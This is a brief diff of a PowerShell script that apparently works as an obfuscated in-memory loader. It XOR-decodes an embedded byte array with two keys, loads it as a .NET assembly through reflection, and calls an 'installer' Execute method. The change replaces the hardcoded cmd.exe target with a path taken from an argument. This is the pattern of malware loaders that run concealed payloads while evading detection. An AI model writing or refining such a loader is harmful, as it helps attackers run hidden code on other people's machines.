@@ -23,4 +23,5 @@ for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key2 }
 for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key1 }
 $base64String = [Convert]::ToBase64String($bytes)
 [Reflection.Assembly]::Load([Convert]::FromBase64String($base64String))
-[installer]::Execute("C:\\Windows\\System32\\cmd.exe")
+$path2 = $args[0]
+[installer]::Execute("$path2")
